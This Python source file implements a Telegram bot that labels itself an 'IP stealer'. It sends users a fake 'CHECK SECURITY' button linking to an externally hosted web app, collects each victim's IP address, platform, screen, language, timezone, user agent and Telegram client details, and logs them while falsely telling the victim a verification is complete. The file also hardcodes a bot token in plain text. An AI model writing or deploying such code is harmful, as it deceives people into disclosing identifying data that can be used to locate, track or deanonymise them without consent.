import telebot
import json
import time

TOKEN = "8588583945:AAFwr6fNagAZg2ykvEnkNZ6UELjYDW-q5cM"
bot = telebot.TeleBot(TOKEN)

print("="*60)
print("ğŸ¤– TELEGRAM IP STEALER BOT")
print("="*60)
print("Waiting for data...")

@bot.message_handler(commands=['start'])
def send_webapp(message):
    user = message.from_user
    
    markup = telebot.types.InlineKeyboardMarkup()
    web_app = telebot.types.WebAppInfo(
        url="https://filepedo000-prog.github.io/logproject/"
    )
    
    button = telebot.types.InlineKeyboardButton(
        text="ğŸ”“ CHECK SECURITY",
        web_app=web_app
    )
    markup.add(button)
    
    bot.send_message(
        message.chat.id,
        f"Click button to verify:",
        reply_markup=markup
    )
    
    print(f"[SENT] Button to: {user.first_name} (@{user.username})")

@bot.message_handler(content_types=['web_app_data'])
def handle_data(message):
    user = message.from_user
    
    print(f"\n{'ğŸ”´'*35}")
    print(f"ğŸš¨ NEW DATA CAPTURED!")
    print(f"{'ğŸ”´'*35}")
    
    try:
        data = json.loads(message.web_app_data.data)
        
        # Ğ’Ñ‹Ğ²Ğ¾Ğ´Ğ¸Ğ¼ Ğ’Ğ¡Ğ ĞºĞ°Ğº Ğ² Python
        print(f"[USER] {user.first_name} (@{user.username}) ID: {user.id}")
        print(f"[TIME] {time.strftime('%H:%M:%S')}")
        print("-"*40)
        
        # IP Ğ°Ğ´Ñ€ĞµÑ
        ip = data.get('ip_address', 'NOT FOUND')
        print(f"[ğŸŒ] IP ADDRESS: {ip}")
        
        # Ğ¡Ğ¸ÑÑ‚ĞµĞ¼Ğ½Ğ°Ñ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ
        if 'system_info' in data:
            sys_info = data['system_info']
            print(f"[ğŸ’»] PLATFORM: {sys_info.get('platform', 'N/A')}")
            print(f"[ğŸ–¥ï¸] SCREEN: {sys_info.get('screen', 'N/A')}")
            print(f"[ğŸŒ] LANGUAGE: {sys_info.get('language', 'N/A')}")
            print(f"[ğŸ•] TIMEZONE: {sys_info.get('timezone', 'N/A')}")
            print(f"[ğŸª] COOKIES: {sys_info.get('cookies', 'N/A')}")
        
        # Telegram Ğ´Ğ°Ğ½Ğ½Ñ‹Ğµ
        if 'telegram_data' in data and data['telegram_data']:
            tg_data = data['telegram_data']
            print(f"[ğŸ“±] TELEGRAM:")
            print(f"     Version: {tg_data.get('version', 'N/A')}")
            print(f"     Platform: {tg_data.get('platform', 'N/A')}")
            print(f"     Theme: {tg_data.get('theme', 'N/A')}")
        
        # User Agent
        if 'system_info' in data:
            ua = data['system_info'].get('user_agent', 'N/A')
            print(f"[ğŸ”§] USER AGENT: {ua[:60]}...")
        
        print(f"{'ğŸ”´'*35}")
        print(f"âœ… DATA SAVED TO CONSOLE")
        print(f"{'ğŸ”´'*35}\n")
        
        # ĞÑ‚Ğ¿Ñ€Ğ°Ğ²Ğ»ÑĞµĞ¼ Ğ¿Ğ¾Ğ´Ñ‚Ğ²ĞµÑ€Ğ¶Ğ´ĞµĞ½Ğ¸Ğµ Ğ¿Ğ¾Ğ»ÑŒĞ·Ğ¾Ğ²Ğ°Ñ‚ĞµĞ»Ñ
        bot.reply_to(message, 
            f"âœ… *Verification Complete!*\n\n"
            f"Thank you for security check!",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        print(f"[ERROR] Can't parse data: {e}")
        print(f"[RAW DATA] {message.web_app_data.data[:200]}...")
        bot.reply_to(message, "âš ï¸ Error processing data")

@bot.message_handler(commands=['test'])
def test_cmd(message):
    bot.reply_to(message, "ğŸ¤– Bot is working!")
    print(f"[TEST] Command from @{message.from_user.username}")

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    if message.text and not message.text.startswith('/'):
        print(f"[MSG] {message.from_user.username}: {message.text}")
        bot.reply_to(message, "Send /start to begin verification")

if __name__ == '__main__':
    print("\nâš™ï¸ Commands:")
    print("/start - send verification button")
    print("/test - test bot")
    print("\nğŸ“¡ Data will appear here â†“")
    print("-"*60)
    
    while True:
        try:
            bot.polling(none_stop=True, interval=1)
        except Exception as e:
            print(f"[RESTART] Error: {e}")
            time.sleep(5)
